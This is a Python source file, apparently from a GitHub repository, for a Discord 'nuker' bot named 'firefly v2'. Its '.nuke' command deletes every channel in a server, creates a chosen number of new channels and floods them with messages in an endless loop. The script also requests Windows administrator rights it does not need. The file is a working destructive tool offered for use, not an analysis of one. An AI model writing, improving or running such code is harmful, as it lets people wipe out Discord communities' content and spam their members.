# https://github.com/z3ro-c0nfig/basic-discord-nuker

import asyncio
import discord
from discord.ext import commands
from pyfiglet import figlet_format
from termcolor import colored
import time
import os
import math
import ctypes
import os
import sys
from pyuac import main_requires_admin

@main_requires_admin
def main():
    print("MAKE SURE TO CLOSE THE PROCESS BEHIND THIS!")
    print("hit any key to continue")
    input("made by aki0")

if __name__ == "__main__":
    main()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=".", intents=intents)

def hex_to_ansi(hex_color):
    r = int(hex_color[1:3], 16)
    g = int(hex_color[3:5], 16)
    b = int(hex_color[5:7], 16)
    return f"\033[38;2;{r};{g};{b}m"

def rainbow_gradient(text, phase):
    purple_colors = [
        '#FF0000', '#FF0000', '#FF0000', '#FF0000', '#FF0000',
    ]
    color_step = len(purple_colors) / len(text)

    result = ""
    for i, char in enumerate(text):
        color_index = int((i * color_step + phase) % len(purple_colors))
        color = purple_colors[color_index]
        ansi_color = hex_to_ansi(color)
        result += ansi_color + char
    
    return result + "\033[0m"

def animate_rainbow(text):
    max_phase = len(text) * 2 * math.pi
    duration = 3
    start_time = time.time()

    while True:
        elapsed_time = time.time() - start_time
        phase = (elapsed_time / duration) * max_phase

        os.system('cls' if os.name == 'nt' else 'clear')
        print(rainbow_gradient(text, phase))

        if elapsed_time >= duration:
            break
        
        time.sleep(0.000000000001)

def set_console_title(bot, title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def run_as_admin():
    script = os.path.realpath(__file__)
    params = f"{sys.executable} {script}"
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

text = figlet_format("firefly v2", font="standard")
animate_rainbow(text)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="made by aki0"))
    print(f"Logged in as: {bot.user}")
    print(f"use .nuke to nuke")
    title = f"firefly v2 | made by aki0 | guns.lol/aki0 | {bot.user} | online"
    set_console_title(bot, title)

import asyncio

import asyncio

@bot.command()
async def nuke(ctx):
    try:
        num_channels = int(input("Enter the number of channels to create: "))
        channel_name = input("Enter the name for the channels: ")
        message = input("Enter the message to send: ")

        # Delete all existing channels
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except Exception as e:
                print(f"Error deleting channel {channel.name}: {e}")

        created_channels = []
        for i in range(num_channels):
            try:
                new_channel = await ctx.guild.create_text_channel(channel_name, position=i)
                print(f"Created channel: {channel_name}")
                created_channels.append(new_channel)
            except Exception as e:
                print(f"Error creating channel {channel_name}: {e}")

        while True:
            for channel in created_channels:
                try:
                    asyncio.create_task(channel.send(message))
                except Exception as e:
                    print(f"Error sending message to channel {channel.name}: {e}")

            await asyncio.sleep(0.00000000000001)  # Adjust the sleep time for faster or slower sending

    except Exception as e:
        print(f"Error: {e}")


bot_token = input("Enter your bot token: ")

if ctypes.windll.shell32.IsUserAnAdmin():
    bot.run(bot_token)
else:
    run_as_admin()
